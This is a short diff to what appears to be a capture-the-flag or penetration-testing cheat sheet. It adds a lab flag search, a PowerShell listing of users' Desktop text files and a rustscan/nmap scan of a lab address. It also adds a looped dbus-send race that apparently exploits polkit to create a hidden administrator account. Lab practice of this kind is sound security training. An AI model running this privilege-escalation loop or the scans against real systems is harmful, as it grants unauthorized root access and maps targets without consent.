@@ -1,3 +1,10 @@
 
 
 find / -name proof.txt
+
+Get-ChildItem "C:\Users\*\Desktop\*.txt" -ErrorAction SilentlyContinue
+
+
+rustscan -a 10.10.11.10 --ulimit 5000 -- -sCV -oN nmap/builder
+
+for i in {1..50}; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tempadmin string:"Temp Admin" int32:1 & sleep 0.004; kill $!; done
